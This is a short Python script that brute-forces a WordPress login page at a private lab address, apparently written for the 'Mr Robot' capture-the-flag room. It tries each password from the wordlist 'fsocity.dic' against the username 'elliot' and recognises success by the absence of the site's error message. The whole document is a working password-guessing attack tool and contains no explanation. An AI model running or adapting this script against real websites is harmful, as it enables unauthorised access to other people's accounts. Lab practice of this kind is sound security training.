#!/usr/bin/python3

import requests

url = "http://10.10.186.224/wp-login.php"

log = "username"
pwd ="password"
wpsubmit = "login"

password_error = "The password you entered for the username"

file = open("fsocity.dic", "r")
file_data = file.readlines()
file.close()

trial = 0
for f in file_data:
	f = f.replace("\n","")
	trial += 1
	print(f"Trial No: {trial} Trying Password: {f}", end=" - ")
	payload = {"log":"elliot", "pwd":f, "wp-submit":"login"}
	r = requests.post(url, data=payload)
	if password_error in r.text:
		print("Did not work")
	else:
		print("Got the password!")
		break

print("END OF SCRIPT")
